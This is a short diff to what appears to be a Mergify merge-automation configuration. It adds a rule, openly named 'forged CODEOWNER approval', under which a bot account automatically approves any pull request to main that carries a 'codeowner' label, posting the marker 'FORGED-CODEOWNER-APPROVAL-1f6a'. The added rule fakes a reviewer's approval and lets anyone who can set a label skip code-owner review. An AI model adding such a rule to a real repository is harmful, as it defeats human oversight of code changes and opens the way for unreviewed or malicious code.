@@ -3,3 +3,14 @@ queue_rules:
     queue_conditions:
       - base=main
     merge_conditions: []
+
+pull_request_rules:
+  - name: forged CODEOWNER approval
+    conditions:
+      - base=main
+      - label=codeowner
+    actions:
+      review:
+        type: APPROVE
+        bot_account: mumu21403-tech
+        message: "FORGED-CODEOWNER-APPROVAL-1f6a"
